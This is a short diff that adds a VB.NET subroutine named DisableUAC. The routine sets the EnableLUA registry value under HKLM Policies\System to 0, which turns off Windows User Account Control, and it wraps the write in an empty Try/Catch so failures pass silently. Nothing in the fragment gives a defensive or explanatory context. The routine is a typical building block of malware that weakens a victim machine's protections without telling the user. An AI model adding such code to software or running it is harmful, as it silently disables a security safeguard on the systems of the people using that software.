@@ -1,0 +1,5 @@
+﻿Sub DisableUAC()
+Try
+		Microsoft.Win32.Registry.LocalMachine.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\System", True).SetValue("EnableLUA", 0)
+Catch : End Try
+End Sub
